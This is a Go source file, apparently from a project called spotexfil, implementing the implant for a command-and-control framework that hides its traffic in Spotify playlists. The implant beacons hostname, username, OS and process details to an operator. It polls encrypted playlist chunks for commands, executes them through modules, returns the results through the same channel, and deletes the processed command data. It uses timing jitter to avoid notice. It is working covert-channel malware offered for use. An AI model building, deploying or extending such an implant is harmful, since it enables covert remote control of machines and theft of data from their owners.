package c2

import (
	"context"
	"encoding/json"
	"fmt"
	"hash/adler32"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/protocol"
	"github.com/sourcefrenchy/spotexfil/internal/spotify"
)

// Implant polls for commands and executes them.
type Implant struct {
	client          *spotify.Client
	key             string
	interval        int
	jitter          int
	processedSeqs   map[int]bool
	checkinPending  bool
	consecutiveFails int
}

// NewImplant creates a new implant.
func NewImplant(client *spotify.Client, key string, interval, jitter int) *Implant {
	return &Implant{
		client:        client,
		key:           key,
		interval:      interval,
		jitter:        jitter,
		processedSeqs: make(map[int]bool),
	}
}

// getClientID returns Adler32 hash of primary IP as hex string.
func getClientID() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	ip := "127.0.0.1"
	if err == nil {
		ip = conn.LocalAddr().(*net.UDPAddr).IP.String()
		conn.Close()
	}
	return fmt.Sprintf("%08x", adler32.Checksum([]byte(ip)))
}

// sendCheckin sends a check-in beacon so the operator knows we connected.
func (imp *Implant) sendCheckin() {
	ctx := context.Background()
	clientID := getClientID()

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = "unknown"
	}

	checkinData := map[string]interface{}{
		"client_id": clientID,
		"ip_hash":   clientID,
		"hostname":  hostname,
		"os":        runtime.GOOS + "/" + runtime.GOARCH,
		"user":      username,
		"pid":       os.Getpid(),
	}

	dataBytes, _ := json.Marshal(checkinData)
	result := protocol.NewC2Message("checkin", 0)
	result.Status = "ok"
	result.Data = string(dataBytes)

	encoded, err := protocol.EncodeMessage(result.ToResultMap(), imp.key)
	if err != nil {
		fmt.Printf("[!] Checkin encode failed: %v\n", err)
		return
	}

	chunks, err := protocol.ChunkPayload(encoded, 0,
		protocol.ChannelRes, imp.key)
	if err != nil {
		fmt.Printf("[!] Checkin chunk failed: %v\n", err)
		return
	}

	err = imp.client.WriteC2Playlists(ctx, chunks)
	if err != nil {
		fmt.Printf("[!] Checkin failed at %s: %v\n",
			time.Now().Format("15:04:05"), err)
		fmt.Println("[*] Will retry on next poll cycle")
		imp.checkinPending = true
		return
	}
	fmt.Printf("[*] Check-in sent (client_id=%s) at %s\n",
		clientID, time.Now().Format("15:04:05"))
	imp.checkinPending = false
}

// isRateLimit checks if an error is a Spotify rate limit.
func isRateLimit(err error) bool {
	if err == nil {
		return false
	}
	s := strings.ToLower(err.Error())
	return strings.Contains(s, "rate") || strings.Contains(s, "429") || strings.Contains(s, "too many")
}

// isTokenExpired checks if the error is an expired/invalid token.
func isTokenExpired(err error) bool {
	if err == nil {
		return false
	}
	s := strings.ToLower(err.Error())
	return strings.Contains(s, "401") || strings.Contains(s, "expired") ||
		strings.Contains(s, "unauthorized") || strings.Contains(s, "invalid access token")
}

// parseRetryAfter extracts seconds from Spotify rate limit error message.
// Spotify errors contain "Retry will occur after: N s" or "Retry-After: N".
func parseRetryAfter(err error) int {
	if err == nil {
		return 0
	}
	s := err.Error()

	// Try "after: N s" pattern
	if idx := strings.Index(s, "after:"); idx >= 0 {
		rest := strings.TrimSpace(s[idx+6:])
		rest = strings.TrimSuffix(rest, " s")
		rest = strings.TrimSuffix(rest, "s")
		rest = strings.Fields(rest)[0]
		var n int
		if _, err := fmt.Sscanf(rest, "%d", &n); err == nil {
			return n
		}
	}
	return 0
}

// formatDuration formats seconds into human-readable duration.
func formatDuration(seconds int) string {
	if seconds < 60 {
		return fmt.Sprintf("%ds", seconds)
	}
	if seconds < 3600 {
		return fmt.Sprintf("%dm%ds", seconds/60, seconds%60)
	}
	h := seconds / 3600
	m := (seconds % 3600) / 60
	return fmt.Sprintf("%dh%dm", h, m)
}

// handleAPIError logs a user-friendly message for Spotify API errors.
// Returns the recommended wait time in seconds (0 = no wait).
func handleAPIError(err error, context string) int {
	if isRateLimit(err) {
		retryAfter := parseRetryAfter(err)
		if retryAfter > 600 {
			fmt.Printf("[!] Spotify rate limit HARD BLOCK (%s): "+
				"retry after %s\n"+
				"    This happens when the API is hit too frequently.\n"+
				"    Increase --interval or wait for the block to lift.\n",
				context, formatDuration(retryAfter))
		} else if retryAfter > 0 {
			fmt.Printf("[!] Spotify rate limited (%s): "+
				"retry after %s\n", context, formatDuration(retryAfter))
		}
		return retryAfter
	}
	if isTokenExpired(err) {
		fmt.Printf("[!] Spotify token expired (%s): "+
			"delete .cache-* and re-authenticate\n", context)
		return 0
	}
	fmt.Printf("[!] Spotify API error (%s): %v\n", context, err)
	return 0
}

// Run starts the main polling loop.
func (imp *Implant) Run() {
	fmt.Println("[*] Implant started, polling for commands...")
	imp.sendCheckin()

	for {
		imp.pollAndExecute()

		// Calculate sleep: normal jitter + exponential backoff on failures
		sleepTime := imp.interval + rand.Intn(2*imp.jitter+1) - imp.jitter
		if imp.consecutiveFails > 0 {
			// Exponential backoff: 30s, 60s, 120s, 240s, max 300s
			backoff := 30 * (1 << (imp.consecutiveFails - 1))
			if backoff > 300 {
				backoff = 300
			}
			sleepTime = backoff
			fmt.Printf("[*] Backoff: next poll in %s (fail #%d)\n",
				formatDuration(sleepTime), imp.consecutiveFails)
		}
		if sleepTime < 10 {
			sleepTime = 10
		}
		time.Sleep(time.Duration(sleepTime) * time.Second)
	}
}

func (imp *Implant) pollAndExecute() {
	ctx := context.Background()

	// Retry checkin if it failed earlier, but not if we're rate limited
	if imp.checkinPending && imp.consecutiveFails == 0 {
		imp.sendCheckin()
	}

	seqGroups, err := imp.client.ReadC2Playlists(ctx,
		protocol.ChannelCmd, imp.key, -1)
	if err != nil {
		imp.consecutiveFails++
		if isTokenExpired(err) {
			fmt.Printf("[!] Token expired at %s: delete .cache-* and re-authenticate\n",
				time.Now().Format("15:04:05"))
		} else if isRateLimit(err) {
			retryAfter := parseRetryAfter(err)
			if retryAfter > 0 {
				fmt.Printf("[!] Rate limited at %s, server says wait %s\n",
					time.Now().Format("15:04:05"), formatDuration(retryAfter))
				time.Sleep(time.Duration(retryAfter) * time.Second)
				imp.consecutiveFails = 0 // reset after honoring the wait
			} else {
				// No Retry-After parsed — only log first occurrence
				if imp.consecutiveFails <= 1 {
					fmt.Printf("[!] Rate limited at %s, backing off\n",
						time.Now().Format("15:04:05"))
				}
			}
		} else {
			fmt.Printf("[!] Poll error at %s: %v\n",
				time.Now().Format("15:04:05"), err)
		}
		return
	}
	imp.consecutiveFails = 0 // reset on success

	if len(seqGroups) == 0 {
		return
	}

	for seqNum, chunkMetas := range seqGroups {
		if imp.processedSeqs[seqNum] {
			_ = imp.client.CleanC2Playlists(ctx,
				protocol.ChannelCmd, imp.key, seqNum)
			continue
		}

		payload := protocol.ReassemblePayload(chunkMetas)
		cmdDict, err := protocol.DecodeMessage(payload, imp.key)
		if err != nil {
			errStr := strings.ToLower(err.Error())
			if strings.Contains(errStr, "tag") || strings.Contains(errStr, "decrypt") || strings.Contains(errStr, "cipher") {
				fmt.Printf("[!] Decryption failed for seq=%d: encryption key mismatch with operator?\n", seqNum)
			} else {
				fmt.Printf("[!] Failed to decode seq=%d: %v\n", seqNum, err)
			}
			_ = imp.client.CleanC2Playlists(ctx,
				protocol.ChannelCmd, imp.key, seqNum)
			continue
		}

		msg := protocol.FromCommandMap(cmdDict)
		fmt.Printf("[*] Executing seq=%d module=%s\n", seqNum, msg.Module)

		result := imp.execute(msg)
		imp.sendResult(ctx, result)
		_ = imp.client.CleanC2Playlists(ctx,
			protocol.ChannelCmd, imp.key, seqNum)
		imp.processedSeqs[seqNum] = true
	}
}

func (imp *Implant) execute(msg *protocol.C2Message) *protocol.C2Message {
	mod := GetModule(msg.Module)
	if mod == nil {
		return &protocol.C2Message{
			Module: msg.Module,
			Seq:    msg.Seq,
			Status: "error",
			Data:   fmt.Sprintf("Unknown module: %s", msg.Module),
		}
	}

	status, data := mod.Execute(msg.Args)
	return &protocol.C2Message{
		Module: msg.Module,
		Seq:    msg.Seq,
		Status: status,
		Data:   data,
	}
}

func (imp *Implant) sendResult(ctx context.Context, result *protocol.C2Message) {
	encoded, err := protocol.EncodeMessage(result.ToResultMap(), imp.key)
	if err != nil {
		fmt.Printf("[!] Failed to encode result seq=%d: %v\n", result.Seq, err)
		return
	}

	chunks, err := protocol.ChunkPayload(encoded, result.Seq,
		protocol.ChannelRes, imp.key)
	if err != nil {
		fmt.Printf("[!] Failed to chunk result seq=%d: %v\n", result.Seq, err)
		return
	}

	if err := imp.client.WriteC2Playlists(ctx, chunks); err != nil {
		fmt.Printf("[!] Failed to send result seq=%d: %v\n", result.Seq, err)
		return
	}

	fmt.Printf("[*] Result sent for seq=%d\n", result.Seq)
}
